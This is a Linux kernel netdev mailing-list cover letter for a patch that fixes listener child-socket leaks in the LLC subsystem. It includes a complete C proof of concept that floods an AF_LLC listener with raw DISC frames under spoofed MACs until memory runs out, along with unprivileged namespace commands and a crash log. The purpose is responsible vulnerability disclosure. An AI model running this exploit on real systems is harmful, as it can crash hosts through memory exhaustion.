Received: from mail-pf1-f181.google.com (mail-pf1-f181.google.com [209.85.210.181])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 4CDC93C3F58
	for <netdev@vger.kernel.org>; Wed,  5 Aug 2026 18:00:16 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.181
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785952817; cv=none; b=oBUGwbmtM9PJcRL+ZcmisatDgt7iSxWH9fg8yKL7C7zGc3mRZxJIcqR0u9ErhKQhzTloUiOw/Fa9lMCdMqfuz5TcVWdbLH9ZBN9RKOCi6bEzftDuihQC97JbRwl2CMYPtWk5IOhVmK4kj+dtKrPtrWZL5Bn7Vl5FdHbU6/zCqcw=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785952817; c=relaxed/simple;
	bh=MeZf9Aaj7EroQDGVkB5MrknFw95itEKa1g2VXNL6F08=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=hQ0vOHuNBX7qiE27iUNLws2C7J5kzcvogx8iBm9wnvwDaDvph1OgrMUMqJdJbe+Qwi2fzPZW1w/QpmMgojWPFep1kRty5K0qS/M65uUAPZTNFNQzOaRoP+EhzJdsflAETu5OvCa08607ZB4/vD3PgeLf65TB504biSmhFk8gdJk=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=M1+ul/b/; arc=none smtp.client-ip=209.85.210.181
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="M1+ul/b/"
Received: by mail-pf1-f181.google.com with SMTP id d2e1a72fcca58-84830c774a0so1469391b3a.1
        for <netdev@vger.kernel.org>; Wed, 05 Aug 2026 11:00:16 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1785952815; x=1786557615; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=19pIVsndDkZ1C57ED7DZEVsO2OVZ3QvC/PPHXhdG0rs=;
        b=M1+ul/b/pwpalulQ0BPNhft1p4h/iCjriK8cwn+GSshlQjmXJjnL/wa9y2iYCdQ7j3
         rktzg46PuyEC3KjAe4Lp0dXD5wD9mF5LzAgFVqcnKmHS2OCgx4PHwM3eB3LtD8ZuHMXh
         RJkQlqnKbOZPB8QACC4rYeUHJWt7Qjjgwk07H9NYqPktCO0bUbUp+qxqbWT3tzzWNeJX
         G2yx2aYA10b+b6jbBN+QPOjDVvH8PXHTc71F8GV/vapJe053RkLMSPW+lbgaf9M2Ic5g
         0M41oh9AmlNrorbMGxcFGRpOQlocLemMs32Qrp5qZVpJjX5gPEXAG3HluOLEnCHNM6jX
         VpdA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785952815; x=1786557615;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=19pIVsndDkZ1C57ED7DZEVsO2OVZ3QvC/PPHXhdG0rs=;
        b=N1nSIoKjG6HljW+ku0Oq6myV29H8rTyrZfP/gMBV+Ydi58gYcXIWnQAWSrdTw2Mi2X
         hiHgB4yuQUbT3oL4p/t/hbtqmKdKREESo7jkmHwihuDjvmLoLYi/e1nZ/10X8saOului
         asPT+S6O7nGn8qradRDVEU+yKRdgcwiJS22NGC1k8LfNJTbhIoujL2fBzSJJbTzwJ13n
         bRZkZVWVhJk9wiCvcic3e0im0WmFCh34OzbEyf4I+IcsTimJADbU6mB9I7ijsMlgOV3L
         kE/igfd4cTPGpy3/kPc1B8eAvQqfn1ZYw4PqociwgtJk2rsmRc06Clb1UpoBSd81sc72
         ryTQ==
X-Gm-Message-State: AOJu0YwJcdoEu4oV5WfMOtoWVcesPuCan9Qf4T4Y6GT/gCg6o8giRqd+
	2ZWhTZYg3o7nidQVm0qr9oqHO5AVESIS4fPuCtjq+JZT4V7AQKhkenAh+e88pydg23/0x8iRher
	MLKvR3I3Z
X-Gm-Gg: AR+sD12bXYqkwyYCsHmoqPs3+4zx5oKsHXpBWy4W1ZtP/mv2K1pbdECKvacHzzsXVUe
	DDM5nqd+wYxrECni7eAVq2/gJwOKJWq7+y0kkT3ko8ZpbKz9tf6Ro0/azJHFTXrmUlkAMoaf3J1
	jJOKj6Msi180XoE0kxTxWd0eaG2y4hhAi/BHoE+ttlWkua78SV+DRdxdgRUP7Ovm2z+A0n+yOnZ
	JKK28pe8JjUWHx2Bj7LyK6GFcuhFLpJWhqGhSDv8nRXRhmZvhRVW1Di45o8HA1La1/ETUab/A3f
	ehoIdVbLyTyF3uqv9ZYjyVENPsWEsVOxY2K2NEmdZdWcv/5AO7pTXHDxKToSfwoL7O6ihdtqRRX
	NWT9G+5OzKUkFUb6gm0j1Aa3k/SdkSoG9g0qblBTfRhCPm3wHjbXH6aXE79sJiPq3voFlcqJ4y9
	Za6ZnigPBJPXXit6UONI/kWIeosHSPABdMhsKfhW+/vrO2GGHe8w1P1cA7hMYS0yvGmQxn769Q1
	gFVR4qVtg==
X-Received: by 2002:a05:6a00:1816:b0:848:425a:4e31 with SMTP id d2e1a72fcca58-84f2e07138fmr9835478b3a.24.1785952815126;
        Wed, 05 Aug 2026 11:00:15 -0700 (PDT)
Received: from localhost.localdomain ([115.192.254.68])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-84f2e2e06a6sm1281316b3a.15.2026.08.05.11.00.11
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 05 Aug 2026 11:00:14 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: netdev@vger.kernel.org
Cc: davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	tim.bird@sony.com,
	luoxuanqiang@kylinos.cn,
	vega@nebusec.ai,
	zihanx@nebusec.ai
Subject: [PATCH net v3 0/1] llc: fix listener child socket leaks before passive open completes
Date: Wed,  5 Aug 2026 17:59:44 +0000
Message-ID: <20260805175945.10698-1-zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated a issue in net/llc/llc_conn.c. The bug is reachable by a
non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

llc_conn_handler() publishes a passive-open child to the LLC SAP tables before
the listener-side handshake finishes and before the child becomes visible to
accept() via LLC_CONN_PRIM. That published child already pins its netdev
reference, so any listener-side path which exits before LLC_CONN_PRIM leaves a
socket behind that accept() can never return.

The leak is not limited to the original non-SABME reproducer path. The same
root cause also covers valid SABME traffic when the passive-open child is
created first but packet processing later fails before LLC_CONN_PRIM, including
direct processing failure, sk_add_backlog() failure, and backlog-side drops.

The fix keeps the existing immediate child publication semantics so established
socket lookup still wins over the listener during passive open. Instead of
changing the passive-open matching model, it tracks whether a listener-created
child is still pending publication to accept(), clears that pending state only
when LLC_CONN_PRIM is emitted, and rolls the child back out of the SAP tables on
every earlier failure or drop path.

The root-cause fact fixed here predates d389424e00f9. Its parent already
creates a listener-side child, publishes it to the SAP tables before
LLC_CONN_PRIM, and has no rollback path if processing exits early. In the local
visible history, the earliest commit where that root-cause fact is already
present is 1da177e4c3f4 ("Linux-2.6.12-rc2"), so Fixes points there.

The reproducer writes panic_on_oom only to turn the final memory exhaustion into
stable crash evidence after the leak is already confirmed. It is not a
prerequisite for the underlying bug or for the non-root trigger path itself.

packetdrill was not used here because the trigger depends on combining a PF_LLC
listening socket with raw AF_PACKET injection over a veth pair while rotating
the source MAC address to force distinct passive-open children. The PoC is
centered on that listener-plus-raw-packet resource leak path rather than on a
packetdrill-friendly timing script.

Reproducer:

    gcc -O2 -static -o poc poc.c
    unshare -Urn ./poc

For the validated run we used the full namespace setup below so the PoC could
create llc_rx0/llc_tx0 and then send the crafted LLC traffic:

    unshare -Urn sh -c '
        ip link add llc_rx0 type veth peer name llc_tx0
        ip link set llc_rx0 address 02:11:22:33:44:55
        ip link set llc_tx0 address 02:11:22:33:44:66
        ip link set llc_rx0 up
        ip link set llc_tx0 up
        ./poc llc_rx0 llc_tx0 110000
    '

For deterministic crash evidence only, after confirming the leak with that
unprivileged trigger path, we additionally set:

    echo 2 > /proc/sys/vm/panic_on_oom

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/if.h>
#include <linux/llc.h>
#include <net/ethernet.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef AF_LLC
#define AF_LLC 26
#endif

#define DEFAULT_RX_IF "llc_rx0"
#define DEFAULT_TX_IF "llc_tx0"
#define DEFAULT_SAP 0xc0
#define DEFAULT_REPORT_EVERY 10000ULL

static void die_errno(const char *what)
{
	perror(what);
	exit(EXIT_FAILURE);
}

static void usage(const char *prog)
{
	fprintf(stderr,
		"usage: %s [rx_if] [tx_if] [count]\n"
		"  rx_if: LLC listener interface (default: %s)\n"
		"  tx_if: raw packet sender interface (default: %s)\n"
		"  count: number of DISC frames to send, 0 means forever\n",
		prog, DEFAULT_RX_IF, DEFAULT_TX_IF);
}

static void get_if_hwaddr(const char *ifname, unsigned char mac[ETH_ALEN])
{
	struct ifreq ifr;
	int fd;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0)
		die_errno("socket(AF_INET)");

	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
		die_errno("ioctl(SIOCGIFHWADDR)");

	memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
	close(fd);
}

static int get_ifindex(const char *ifname)
{
	struct ifreq ifr;
	int fd;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0)
		die_errno("socket(AF_INET)");

	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
		die_errno("ioctl(SIOCGIFINDEX)");

	close(fd);
	return ifr.ifr_ifindex;
}

static int make_listener(const char *ifname, uint8_t sap, unsigned char mac[ETH_ALEN])
{
	struct sockaddr_llc addr;
	int fd;

	fd = socket(AF_LLC, SOCK_STREAM, 0);
	if (fd < 0)
		die_errno("socket(AF_LLC)");

	get_if_hwaddr(ifname, mac);

	memset(&addr, 0, sizeof(addr));
	addr.sllc_family = AF_LLC;
	addr.sllc_arphrd = ARPHRD_ETHER;
	addr.sllc_sap = sap;
	memcpy(addr.sllc_mac, mac, ETH_ALEN);

	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die_errno("bind(AF_LLC)");
	if (listen(fd, 16) < 0)
		die_errno("listen(AF_LLC)");

	return fd;
}

static int make_packet_socket(const char *ifname, int *ifindex_out)
{
	struct sockaddr_ll sll;
	int fd;
	int one = 1;
	int ifindex = get_ifindex(ifname);

	fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (fd < 0)
		die_errno("socket(AF_PACKET)");

	setsockopt(fd, SOL_PACKET, PACKET_QDISC_BYPASS, &one, sizeof(one));

	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_ALL);
	sll.sll_ifindex = ifindex;

	if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0)
		die_errno("bind(AF_PACKET)");

	*ifindex_out = ifindex;
	return fd;
}

static void fill_src_mac(unsigned char mac[ETH_ALEN], uint64_t n)
{
	mac[0] = 0x02;
	mac[1] = (n >> 32) & 0xff;
	mac[2] = (n >> 24) & 0xff;
	mac[3] = (n >> 16) & 0xff;
	mac[4] = (n >> 8) & 0xff;
	mac[5] = n & 0xff;
}

int main(int argc, char **argv)
{
	static unsigned char frame[ETH_ZLEN];
	unsigned char dst_mac[ETH_ALEN];
	unsigned char src_mac[ETH_ALEN];
	struct sockaddr_ll sll;
	const char *rx_if = DEFAULT_RX_IF;
	const char *tx_if = DEFAULT_TX_IF;
	uint64_t count = 0;
	uint64_t i = 1;
	int listener_fd;
	int packet_fd;
	int ifindex;

	if (argc > 1 && (!strcmp(argv[1], "-h") || !strcmp(argv[1], "--help"))) {
		usage(argv[0]);
		return 0;
	}
	if (argc > 1)
		rx_if = argv[1];
	if (argc > 2)
		tx_if = argv[2];
	if (argc > 3) {
		char *end = NULL;

		errno = 0;
		count = strtoull(argv[3], &end, 0);
		if (errno || !end || *end != '\0') {
			fprintf(stderr, "invalid count: %s\n", argv[3]);
			return EXIT_FAILURE;
		}
	}
	if (argc > 4) {
		usage(argv[0]);
		return EXIT_FAILURE;
	}

	listener_fd = make_listener(rx_if, DEFAULT_SAP, dst_mac);
	packet_fd = make_packet_socket(tx_if, &ifindex);

	memset(frame, 0, sizeof(frame));
	memcpy(frame, dst_mac, ETH_ALEN);
	((struct ethhdr *)frame)->h_proto = htons(3);
	frame[ETH_HLEN + 0] = DEFAULT_SAP;
	frame[ETH_HLEN + 1] = 0x04;
	frame[ETH_HLEN + 2] = 0x43; /* DISC command, P/F=0 */

	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = ifindex;
	sll.sll_halen = ETH_ALEN;
	memcpy(sll.sll_addr, dst_mac, ETH_ALEN);

	fprintf(stderr,
		"listener_if=%s sender_if=%s sap=0x%02x count=%s\n",
		rx_if, tx_if, DEFAULT_SAP, count ? argv[3] : "0");
	fprintf(stderr,
		"listener_mac=%02x:%02x:%02x:%02x:%02x:%02x\n",
		dst_mac[0], dst_mac[1], dst_mac[2],
		dst_mac[3], dst_mac[4], dst_mac[5]);
	fprintf(stderr,
		"sending LLC DISC commands with a unique spoofed source MAC each time\n");

	while (!count || i <= count) {
		fill_src_mac(src_mac, i);
		if (!memcmp(src_mac, dst_mac, ETH_ALEN))
			src_mac[ETH_ALEN - 1] ^= 1;
		memcpy(frame + ETH_ALEN, src_mac, ETH_ALEN);

		if (sendto(packet_fd, frame, sizeof(frame), 0,
			   (struct sockaddr *)&sll, sizeof(sll)) < 0)
			die_errno("sendto(AF_PACKET)");

		if (!(i % DEFAULT_REPORT_EVERY))
			fprintf(stderr, "sent=%llu\n",
				(unsigned long long)i);
		i++;
	}

	close(packet_fd);
	close(listener_fd);
	return 0;
}
------END poc.c--------

----BEGIN crash log----
[ 1665.704541][T10284] Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabled

[ 1665.705358][T10284] CPU: 0 UID: 0 PID: 10284 Comm: poc Not tainted 6.12.74 #3

[ 1665.705911][T10284] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014

[ 1665.706676][T10284] Call Trace:

[ 1665.706943][T10284]  <TASK>

[1665.707181][T10284] dump_stack_lvl (lib/dump_stack.c:105 (discriminator 2))

[1665.707568][T10284] panic (kernel/panic.c:339 (discriminator 1))

[1665.707918][T10284] ? dump_header (include/linux/rcupdate.h:815 (discriminator 1) mm/oom_kill.c:455 (discriminator 1) mm/oom_kill.c:478 (discriminator 1))

[1665.708305][T10284] ? __pfx_panic (kernel/panic.c:277)
-----END crash log-----

changes in v3:
  - Drop the unused llc_conn_handler() local rc variable reported in
    review.
  - Rebase the numbered patch and cover onto commit
    ede76849012e45ffb2193ad110b42027eec02c5c.
  - v2 Link: https://lore.kernel.org/all/cover.1785386749.git.zihanx@nebusec.ai/
changes in v2:
  - Rework the fix to preserve the existing passive-open tuple matching
    semantics instead of deferring child publication until LLC_CONN_PRIM.
  - Track listener-created children which are still pending publication
    to accept(), and roll them back on every earlier failure or drop
    path.
  - Cover both the original non-SABME leak and SABME paths which fail
    before LLC_CONN_PRIM, including backlog enqueue and backlog drop
    failures.
  - Correct Fixes to 1da177e4c3f4 ("Linux-2.6.12-rc2") based on the
    earliest locally visible history carrying the same root-cause fact.
  - Clarify in Bug details that panic_on_oom is only crash-evidence
    setup and explain why packetdrill was not used for this reproducer.
  - v1 Link: https://lore.kernel.org/all/cover.1784725007.git.zihanx@nebusec.ai/

Best regards,
Zihan Xi

Zihan Xi (1):
  llc: fix listener child socket leaks before passive open completes

 include/net/llc_conn.h | 11 +++++++++++
 net/llc/llc_conn.c     | 41 ++++++++++++++++++++++++++++++++++++-----
 2 files changed, 47 insertions(+), 5 deletions(-)

-- 
2.43.0

